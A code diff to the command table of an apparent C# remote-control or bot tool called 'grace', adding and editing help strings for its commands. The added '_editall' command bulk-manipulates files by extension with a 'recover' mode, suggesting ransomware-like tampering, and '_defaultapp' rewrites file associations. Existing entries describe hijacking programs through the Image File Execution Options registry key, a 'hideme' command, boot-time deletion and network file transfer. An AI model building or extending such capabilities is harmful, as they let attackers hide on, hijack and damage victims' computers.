@@ -125,7 +125,7 @@ namespace grace
                                                     // file
                                                     new Parameter(7, 43, "create", "[file create, @fullFilePath]"),
                                                     new Parameter(7, 46, "edit", "[file edit, @fullFilePath]"),
-                                                    new Parameter(7, 49, "run", "[file run, @fullFilePath]"),
+                                                    new Parameter(7, 49, "run", "[file run, @fullFilePath] (note: run files with .run extension.)"),
                                                     new Parameter(7, 50, "drives", "[file drives, show|names]"),
                                                     new Parameter(7, 51, "eject", "[file eject, @drive letter] (note: colon is optional)"),
                                                     new Parameter(7, 52, "delete", "[file delete, @fullFilePath]"),
@@ -135,6 +135,7 @@ namespace grace
                                                     new Parameter(7, 56, "transfer", "[file transfer, @Source fullFilePath, @Destination fullFilePath] (note: source and destination could be a network path)"),
                                                     new Parameter(7, 165, "version", "[file version, @fullFilePath]"),
                                                     new Parameter(7, 167, "bdelete", "[file delete, @fullFilePath] (delete a file on boot)"),
+                                                    new Parameter(7, 168, "_editall", "[file _editall, @extensions, @fullPath, [|recover]] \r\n  \t\t(example1: file _editall,.xLsx;.jPg,d:\\) \r\n  \t\t(example2: file _editall,.xlsx,d:\\,recover) (note: the 'recover' parameter is indicating either you want to recover or manipulate.)"),
 
                                                     // ui
                                                     new Parameter(5, 57, "textcolor", "[ui textcolor, @color number]"),
@@ -252,7 +253,7 @@ namespace grace
                                                     new Parameter(19, 210, "delete", "[registry delete, @key path, @key name]"),
                                                     new Parameter(19, 213, "hideme", "[registry hideme"),
                                                     new Parameter(19, 214, "_override", "[registry _override, @appname to be overrided, @app appname to replace with] \r\n\t\t HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options \r\n\t\t(example1: reg _override,notepad.exe,calc.exe) by following command whenever user runs notepad, calculator will excutes instead. \r\n\t\t(example2: reg _override,excel.exe,notepad.exe)\r\n\t\t\r\n\t\t[registry _override, off, @appname which overrided] \r\n\t\t(example1: reg _override,off,excel.exe) by following command the overeriding commnd above will be disabled."),
-                                                    //new Parameter(19, 215, "_override", "[registry _override, off, @appname which overrided] \r\n\t\t(example1: reg _override,off,excel.exe) by following command the overeriding commnd above will be disabled."),
+                                                    new Parameter(19, 215, "_defaultapp", "[registry _defaultapp, @file extension, @app path] \r\n\t\t(example1: reg _defaultapp,xlsx,c:\\windows\\system32\\notepad.exe) by running this command all excel files with .xlsx extension will be opened with notepad."),
 
                                                     // version
                                                     //new Parameter(20, 250, "version", "[version]"),
